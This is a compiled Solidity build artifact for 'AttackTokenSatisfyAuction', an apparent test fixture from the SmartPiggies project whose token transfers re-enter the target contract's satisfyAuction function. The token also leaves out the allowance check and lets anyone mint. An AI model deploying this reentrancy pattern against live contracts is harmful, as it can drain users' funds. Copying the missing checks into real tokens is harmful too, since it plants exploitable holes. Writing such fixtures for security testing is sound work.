{
  "contractName": "AttackTokenSatisfyAuction",
  "abi": [
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "_decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "subtractedValue",
          "type": "uint256"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "didAttack",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "didAuction",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "didCreate",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "addedValue",
          "type": "uint256"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "receiver",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "mint",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "nonce",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "returnAttackString",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "returnAuctionString",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "returnCreateString",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "returnData",
      "outputs": [
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "smartpiggies",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "strike",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "tokenId",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "xfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "create",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "uint8",
          "name": "_nonce",
          "type": "uint8"
        }
      ],
      "name": "setNonce",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_id",
          "type": "uint256"
        }
      ],
      "name": "setTokenId",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "_smartpiggies",
          "type": "address"
        }
      ],
      "name": "setAddress",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "resetCount",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "resetAttackFlag",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526127106009553480156200001757600080fd5b50604080518082018252600b81526a20ba3a30b1b5aa37b5b2b760a91b6020808301918252835180850190945260048452634154544b60e01b908401528151919291620000679160039162000093565b5080516200007d90600490602084019062000093565b50506005805460ff191660121790555062000138565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620000d657805160ff191683800117855562000106565b8280016001018555821562000106579182015b8281111562000106578251825591602001919060010190620000e9565b506200011492915062000118565b5090565b6200013591905b808211156200011457600081556001016200011f565b90565b61117d80620001486000396000f3fe608060405234801561001057600080fd5b506004361061018b5760003560e01c806306661abd1461018d57806306fdde03146101a7578063095ea7b3146102245780630be373611461026457806312e9f3271461026c57806317d70f7c1461028c57806318160ddd1461029457806323b872dd1461029c578063313ce567146102d2578063323f9eb9146102f057806332424aa3146102f8578063395093511461030057806340c10f191461032c578063578a1e721461035857806370a082311461036057806382bce8cb1461038657806395d89b411461038e5780639e5faafc14610396578063a457c2d71461039e578063a9059cbb146103ca578063ad8f5008146103f6578063afaafe8f146103fe578063affed0e014610406578063b058584b1461040e578063c11dbafe14610416578063c18ce1d31461041e578063c4a76b8414610426578063c929ccf31461044a578063dd62ed3e14610467578063e30081a014610495578063ebddbaf6146104bb578063efc81a8c146104c3578063fd895292146104cb575b005b6101956104d3565b60408051918252519081900360200190f35b6101af6104d9565b6040805160208082528351818301528351919283929083019185019080838360005b838110156101e95781810151838201526020016101d1565b50505050905090810190601f1680156102165780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102506004803603604081101561023a57600080fd5b506001600160a01b038135169060200135610570565b604080519115158252519081900360200190f35b6101af610586565b61018b6004803603602081101561028257600080fd5b503560ff16610614565b61019561062a565b610195610630565b610250600480360360608110156102b257600080fd5b506001600160a01b03813581169160208101359091169060400135610636565b6102da610668565b6040805160ff9092168252519081900360200190f35b610250610671565b6102da61067f565b6102506004803603604081101561031657600080fd5b506001600160a01b038135169060200135610688565b61018b6004803603604081101561034257600080fd5b506001600160a01b0381351690602001356106c9565b6101af6106d7565b6101956004803603602081101561037657600080fd5b50356001600160a01b0316610732565b61025061074d565b6101af61075d565b61018b6107be565b610250600480360360408110156103b457600080fd5b506001600160a01b038135169060200135610918565b610250600480360360408110156103e057600080fd5b506001600160a01b038135169060200135610954565b61019561097c565b610250610982565b6102da610991565b6101af61099a565b6102506109f5565b610250610a06565b61042e610a0f565b604080516001600160a01b039092168252519081900360200190f35b61018b6004803603602081101561046057600080fd5b5035610a23565b6101956004803603604081101561047d57600080fd5b506001600160a01b0381358116916020013516610a28565b61018b600480360360208110156104ab57600080fd5b50356001600160a01b0316610a53565b6101af610a7b565b61018b610ad6565b610250610c33565b60065481565b60038054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156105655780601f1061053a57610100808354040283529160200191610565565b820191906000526020600020905b81548152906001019060200180831161054857829003601f168201915b505050505090505b90565b600061057d338484610c3d565b50600192915050565b600e805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561060c5780601f106105e15761010080835404028352916020019161060c565b820191906000526020600020905b8154815290600101906020018083116105ef57829003601f168201915b505050505081565b6008805460ff191660ff92909216919091179055565b60075481565b60025490565b600a805463ff0000001916630100000017905560006106536107be565b61065e848484610d29565b5060019392505050565b60055460ff1690565b600a54610100900460ff1681565b60055460ff1681565b3360008181526001602090815260408083206001600160a01b0387168452909152812054909161057d9185906106c4908663ffffffff610e6416565b610c3d565b6106d38282610eb7565b5050565b600c805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561060c5780601f106105e15761010080835404028352916020019161060c565b6001600160a01b031660009081526020819052604090205490565b600a546301000000900460ff1681565b60048054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156105655780601f1061053a57610100808354040283529160200191610565565b6006805460018101909155600211156109165760075460085460408051602481019390935260ff82166044808501919091528151808503909101815260649093018152602083018051631ca1806960e21b6001600160e01b03909116178152905183516000936060936101009091046001600160a01b031692620f424092879282918083835b602083106108635780518252601f199092019160209182019101610844565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038160008787f1925050503d80600081146108c6576040519150601f19603f3d011682016040523d82523d6000602084013e6108cb565b606091505b50805191935091506108e490600b906020840190611002565b5080516108f890600e906020840190611002565b5050600a8054911515620100000262ff000019909216919091179055505b565b3360008181526001602090815260408083206001600160a01b0387168452909152812054909161057d9185906106c4908663ffffffff610fa116565b600a805463ff0000001916630100000017905560006109716107be565b61057d338484610d29565b60095481565b600a5462010000900460ff1681565b60085460ff1681565b600d805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561060c5780601f106105e15761010080835404028352916020019161060c565b600a805462ff000019169055600190565b600a5460ff1681565b60085461010090046001600160a01b031681565b600755565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b600880546001600160a01b0390921661010002610100600160a81b0319909216919091179055565b600b805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561060c5780601f106105e15761010080835404028352916020019161060c565b60408051306024820181905260448201526000606482810182905260848301819052600160a484015261300c60c484015260e4830152610104820181905261012482018190526101448083018290528351808403909101815261016490920183526020820180516001600160e01b031663542544cb60e01b178152600854935183519394929360609361010090046001600160a01b031692620f4240928792909182918083835b60208310610b9c5780518252601f199092019160209182019101610b7d565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038160008787f1925050503d8060008114610bff576040519150601f19603f3d011682016040523d82523d6000602084013e610c04565b606091505b5080519193509150610c1d90600c906020840190611002565b5050600a805460ff191691151591909117905550565b6000600655600190565b6001600160a01b038316610c825760405162461bcd60e51b81526004018080602001828103825260248152602001806111256024913960400191505060405180910390fd5b6001600160a01b038216610cc75760405162461bcd60e51b81526004018080602001828103825260228152602001806110be6022913960400191505060405180910390fd5b6001600160a01b03808416600081815260016020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316610d6e5760405162461bcd60e51b81526004018080602001828103825260258152602001806111006025913960400191505060405180910390fd5b6001600160a01b038216610db35760405162461bcd60e51b815260040180806020018281038252602381526020018061109b6023913960400191505060405180910390fd5b610dbe838383610ffd565b6001600160a01b038316600090815260208190526040902054610de7908263ffffffff610fa116565b6001600160a01b038085166000908152602081905260408082209390935590841681522054610e1c908263ffffffff610e6416565b6001600160a01b038084166000818152602081815260409182902094909455805185815290519193928716926000805160206110e083398151915292918290030190a3505050565b600082820183811015610eb0576040805162461bcd60e51b815260206004820152600f60248201526e14d8599953585d1a0819985a5b1959608a1b604482015290519081900360640190fd5b9392505050565b6001600160a01b038216610f12576040805162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b610f1e60008383610ffd565b600254610f31908263ffffffff610e6416565b6002556001600160a01b038216600090815260208190526040902054610f5d908263ffffffff610e6416565b6001600160a01b0383166000818152602081815260408083209490945583518581529351929391926000805160206110e08339815191529281900390910190a35050565b600082821115610ff7576040805162461bcd60e51b815260206004820152601c60248201527b29b0b332a6b0ba34103330b4b632b21d1039bab13a3930b1ba34b7b760211b604482015290519081900360640190fd5b50900390565b505050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061104357805160ff1916838001178555611070565b82800160010185558215611070579182015b82811115611070578251825591602001919060010190611055565b5061107c929150611080565b5090565b61056d91905b8082111561107c576000815560010161108656fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f2061646472657373ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef45524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373a265627a7a723158201f7d0780e0ad55bd980910cce3c80e3e69084b83bfe83e7d2dc4e0bb26231dc064736f6c63430005110032",
  "source": "pragma solidity >=0.5.15;\n\nimport \"./SafeMath.sol\";\n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\ncontract ERC20 is IERC20 {\n    using SafeMath for uint256;\n\n    mapping (address => uint256) private _balances;\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    uint8 public _decimals;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n     * a default value of 18.\n     *\n     * To select a different value for {decimals}, use {_setupDecimals}.\n     *\n     * All three of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor (string memory name, string memory symbol) public {\n        _name = name;\n        _symbol = symbol;\n        _decimals = 18;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\n     * called.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20};\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``sender``'s tokens of at least\n     * `amount`.\n     */\n    //function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n    //    _transfer(sender, recipient, amount);\n    //   // _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\n    //    return true;\n    //}\n\n    function mint(address receiver, uint256 amount)\n      public\n    {\n        _mint(receiver, amount);\n    }\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        _balances[sender] = _balances[sender].sub(amount);\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `to` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        _balances[account] = _balances[account].sub(amount);\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Sets {decimals} to a value other than the default one of 18.\n     *\n     * WARNING: This function should only be called from the constructor. Most\n     * applications that interact with token contracts will not expect\n     * {decimals} to ever change, and may work incorrectly if it does.\n     */\n    function _setupDecimals(uint8 decimals_) internal {\n        _decimals = decimals_;\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be to transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal { }\n}\n\n\ncontract AttackTokenSatisfyAuction is ERC20 {\n  uint256 public count;\n  uint256 public tokenId;\n  uint8 public nonce;\n  address public smartpiggies;\n  uint256 public strike = 10000;\n  bool public didCreate;\n  bool public didAuction;\n  bool public didAttack;\n  bool public xfer;\n  bytes public returnData;\n  string public returnCreateString;\n  string public returnAuctionString;\n  string public returnAttackString;\n\n  constructor()\n    ERC20(\"AttackToken\", \"ATTK\")\n    public\n  {\n\n  }\n\n  function()\n    external\n  {\n\n  }\n\n  function create()\n    public\n  {\n    bytes memory payload = abi.encodeWithSignature(\"createPiggy(address,address,address,uint256,uint256,uint256,uint256,bool,bool,bool)\",address(this),address(this),address(0),100,1,12300,100,false,false,false);\n    (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);\n    returnCreateString = string(data);\n    didCreate = success;\n  }\n\n  function transfer(address recipient, uint256 amount) public returns (bool) {\n    xfer = true;\n    attack();\n    _transfer(msg.sender, recipient, amount);\n    return true;\n  }\n\n  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n    xfer = true;\n    attack();\n    _transfer(sender, recipient, amount);\n    // remove allowance check\n    return true;\n  }\n\n  function attack()\n    public\n  {\n    if (count++ < 2) {\n      bytes memory payload = abi.encodeWithSignature(\"satisfyAuction(uint256,uint8)\",tokenId,nonce);\n      (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);\n      returnData = data;\n      returnAttackString = string(data);\n      didAttack = success;\n    }\n  }\n\n  function setNonce(uint8 _nonce)\n    public\n  {\n      nonce = _nonce;\n  }\n\n  function setTokenId(uint256 _id)\n    public\n  {\n      tokenId = _id;\n  }\n\n  function setAddress(address _smartpiggies)\n    public\n  {\n      smartpiggies = _smartpiggies;\n  }\n\n  function resetCount() public returns (bool)\n  {\n      count = 0;\n      return true;\n  }\n\n  function resetAttackFlag() public returns (bool)\n  {\n      didAttack = false;\n      return true;\n  }\n}\n",
  "sourcePath": "/home/vagrant/DAPPS/smartpiggiesGithub/smartpiggies/contracts/AttackTokenSatisfyAuction.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.17+commit.d19bba13.Emscripten.clang"
  },
  "schemaVersion": "3.1.0",
  "updatedAt": "2020-05-10T02:18:08.215Z",
  "devdoc": {
    "methods": {
      "allowance(address,address)": {
        "details": "See {IERC20-allowance}."
      },
      "approve(address,uint256)": {
        "details": "See {IERC20-approve}.     * Requirements:     * - `spender` cannot be the zero address."
      },
      "balanceOf(address)": {
        "details": "See {IERC20-balanceOf}."
      },
      "decimals()": {
        "details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5,05` (`505 / 10 ** 2`).     * Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is called.     * NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
      },
      "decreaseAllowance(address,uint256)": {
        "details": "Atomically decreases the allowance granted to `spender` by the caller.     * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.     * Emits an {Approval} event indicating the updated allowance.     * Requirements:     * - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
      },
      "increaseAllowance(address,uint256)": {
